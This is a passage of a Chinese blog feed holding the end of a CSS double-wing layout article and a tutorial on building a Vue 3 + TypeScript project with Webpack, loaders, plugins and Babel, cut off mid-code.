class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col main&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main-wrap&quot;</span>&gt;</span>main<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col left&quot;</span>&gt;</span>left<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;col right&quot;</span>&gt;</span>right<span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>为三栏分别设置宽度并向左浮动：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.col</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427160131485.png" alt="image-20240427160131485"></p></li><li><p>在main部分设置外边距为左右两栏预留空间：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main-wrap</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">300px</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427160148190.png" alt="image-20240427160148190"></p></li><li><p>再使用<code>margin-left</code>将左右两栏移动到其对应位置：</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240427160304512.png" alt="image-20240427160304512"></p></li><li><p>双飞翼布局在放大后则不会出现布局混乱</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240427160335359.png" alt="image-20240427160335359"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建一个 Vue + TypeScript 的 Webpack 项目</title>
      <link href="/posts/c5812c4b.html"/>
      <url>/posts/c5812c4b.html</url>
      
        <content type="html"><![CDATA[<div class="note info flat"><p>文章末尾有快速创建步骤，<a href="#%E5%BF%AB%E9%80%9F%E5%88%9B%E5%BB%BA%E6%AD%A5%E9%AA%A4">点击前往🔗</a></p></div><h2 id="项目创建">项目创建</h2><h3 id="安装TypeScript环境">安装TypeScript环境</h3><p>首先在系统中和项目中安装相关环境依赖（TS）：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i typescript -g</span><br><span class="line">npm i typescript</span><br></pre></td></tr></table></figure><h3 id="创建Webpack项目">创建Webpack项目</h3><p>接下来在搭建项目的目录下打开终端，使用命令初始化构建一个Webpack项空项目：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>然后为项目配置webpack和cli及Vue：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i -D webpack</span><br><span class="line">npm i -D webpack-cli</span><br><span class="line">npm i -D vue</span><br></pre></td></tr></table></figure><blockquote><p><code>package.json</code>为Node.js项目的声明文件，声明了模块依赖、脚本定义和版本名称等内容</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20240426184143940.png" alt="项目初始化"></p><p>在项目中创建配置文件和Vue项目文件</p><ul><li><code>dist</code>为Vue代码的编译结果目录，最后的编译结果都是前端静态资源文件，例如JavaScript、CSS和HTML等文件</li><li><code>public</code>为存放<code>index.html</code>挂载Vue节点页面的目录</li><li><code>src</code>为项目的源码目录，主要开发的代码内容都放在这个文件夹里</li><li><code>src/main.ts</code>为项目入口文件</li><li><code>env.d.ts</code>为TypeScript的.vue声明文件</li><li><code>webpack.config.js</code>为Webpack配置文件</li></ul><p>再使用如下命令创建ts配置文件<code>tsconfig.json</code>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc --init</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20240426235814719.png" alt="项目结构"></p><h2 id="项目配置">项目配置</h2><h3 id="main-ts配置">main.ts配置</h3><p>在入口文件<code>src/main.ts</code>中写入如下内容：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App.vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span> <span class="keyword">as</span> <span class="built_in">any</span>);</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&quot;#app&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="App-vue搭建">App.vue搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">    import &#123; ref, reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="index-html挂载">index.html挂载</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>webpack demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置TS的vue声明文件">配置TS的vue声明文件</h3><p>在<code>env.d.ts</code>中写入如下内容，帮助ts认识vue文件：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;*.vue&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> &#123; <span class="title class_">DefineComponent</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">component</span>: <span class="title class_">DefineComponent</span>&lt;&#123;&#125;, &#123;&#125;, <span class="built_in">any</span>&gt;;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> component;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Loader配置">Loader配置</h3><p>安装Vue使用相关loader：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D vue-loader css-loader style-loader ts-loader</span><br></pre></td></tr></table></figure><h3 id="Plugin配置">Plugin配置</h3><p>webpack并非会将HTML文件一并在dist中分离，可以添加如下plugin分离HTML：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D html-webpack-plugin</span><br></pre></td></tr></table></figure><p>DevServer可以监听文件的变化并自动刷新网页，做到实时预览，使用如下命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D webpack-dev-server</span><br></pre></td></tr></table></figure><p>安装每次打包自动删除旧文件组件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D clean-webpack-plugin</span><br></pre></td></tr></table></figure><h3 id="webpack-config-js配置文件">webpack.config.js配置文件</h3><p>在<code>webpack.config.js</code>文件中写入如下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">VueLoaderPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vue-loader/dist/index&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Configuration</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@type</span> &#123;<span class="type"> Configuration </span>&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">// 可选模式： development / production</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>,</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.ts&#x27;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>: &#123;</span><br><span class="line">        <span class="attr">rules</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">                <span class="attr">use</span>: <span class="string">&#x27;vue-loader&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">                <span class="attr">use</span>: [<span class="string">&quot;style-loader&quot;</span>, <span class="string">&quot;css-loader&quot;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">                <span class="attr">loader</span>: <span class="string">&quot;ts-loader&quot;</span>,</span><br><span class="line">                <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">                <span class="attr">options</span>: &#123;</span><br><span class="line">                    <span class="attr">appendTsSuffixTo</span>: [<span class="regexp">/\.vue$/</span>]</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">template</span>: <span class="string">&#x27;./public/index.html&#x27;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VueLoaderPlugin</span>(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="attr">compress</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">        <span class="attr">alias</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@&quot;</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./src&#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">extensions</span>: [<span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.ts&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">externals</span>: &#123;</span><br><span class="line">        <span class="attr">vue</span>: <span class="string">&#x27;Vue&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// stats: &quot;errors-only&quot;,</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="添加运行命令">添加运行命令</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="项目运行">项目运行</h2><ul><li>打包：<code>webpack</code> / <code>npm run build</code></li><li>运行DevServer：<code>npm run dev</code></li></ul><h2 id="更多可配置">更多可配置</h2><h3 id="CSS分离">CSS分离</h3><p>在配置完CSS-Loader后，webpack会将css封装在js文件中，如果希望将css文件分离，可以安装如下plugin：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D mini-css-extract-plugin</span><br></pre></td></tr></table></figure><p>接下来在配置文件中添加：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MiniCssExtractPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;mini-css-extract-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123;</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&quot;main.css&quot;</span>,</span><br><span class="line">        <span class="attr">chunkFilename</span>: <span class="string">&quot;[id].css&quot;</span></span><br><span class="line">    &#125;),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>接下来调整Loader部分如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 用正则去匹配要用该 loader 转换的 CSS 文件</span></span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">            <span class="attr">use</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">loader</span>: <span class="title class_">MiniCssExtractPlugin</span>.<span class="property">loader</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;css-loader&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>然后CSS文件就会分离出来</p><img src="https://oss.iuoyt.com/img/posts/image-20240426192101932.png" alt="image-20240426192101932" style="zoom:67%;" /><h3 id="CSS压缩">CSS压缩</h3><p>如果希望将CSS文件压缩，可以安装如下plugin：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D css-minimizer-webpack-plugin</span><br></pre></td></tr></table></figure><blockquote><p>如果webpack版本为v4，则使用如下plugin替代：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D optimize-css-assets-webpack-plugin</span><br></pre></td></tr></table></figure></blockquote><p>在配置文件中添加如下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cssMinimizer = <span class="built_in">require</span>(<span class="string">&quot;css-minimizer-webpack-plugin&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后在plugins下增加如下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title function_">cssMinimizer</span>()</span><br></pre></td></tr></table></figure><p>此时再启动webpack可以发现css文件被完成压缩。</p><h3 id="配置Entry入口">配置Entry入口</h3><p>在配置文件中可以配置项目的入口，可以添加如下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">index</span>: <span class="string">&quot;./src/index.js&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="Babel兼容低版本ES语法">Babel兼容低版本ES语法</h3><p>Babel是JavaScript编译器，有了它就可以使用下一代版本的JavaScript。安装babel相关依赖使用如下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm i -D @babel/core</span><br><span class="line"># 最新转码规则</span><br><span class="line">npm i -D @babel/preset-env</span><br><span class="line"># babel依赖</span><br><span class="line">npm i -D babel-loader</span><br></pre></td></tr></table></figure><p>在项目根目录下，创建<code>.babelrc</code>文件然后，将这些规则加入<code>.babelrc</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;presets&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@babel/env&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;plugins&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加模块规则如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">    <span class="attr">use</span>: [<span class="string">&#x27;babel-loader&#x27;</span>],</span><br><span class="line">    <span class="attr">include</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>接下来再使用webpack就可以为ES6以上语法适配低版本。</p><h2 id="快速创建步骤">快速创建步骤</h2><h3 id="环境配置">环境配置</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm i typescript -g</span><br><span class="line">npm init -y</span><br><span class="line">npm i -D typescript webpack webpack-cli vue vue-loader css-loader style-loader ts-loader mini-css-extract-plugin css-minimizer-webpack-plugin @babel/core @babel/preset-env babel-loader html-webpack-plugin webpack-dev-server clean-webpack-plugin</span><br><span class="line">tsc --init</span><br></pre></td></tr></table></figure><h3 id="项目创建-2">项目创建</h3><p>创建项目结构如下</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240426235814719.png" alt="项目结构"></p><ol><li><p>创建<code>dist</code>、<code>src</code>、<code>public</code></p></li><li><p>在<code>src</code>下创建<code>assets</code>、<code>components</code>文件夹</p></li><li><p>创建<code>src/main.ts</code></p> <figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&quot;./App.vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span> <span class="keyword">as</span> <span class="built_in">any</span>);</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&quot;#app&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>创建<code>src/App.vue</code></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">    import &#123; ref, reactive &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li><li><p>创建<code>public/index.html</code></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>webpack demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span 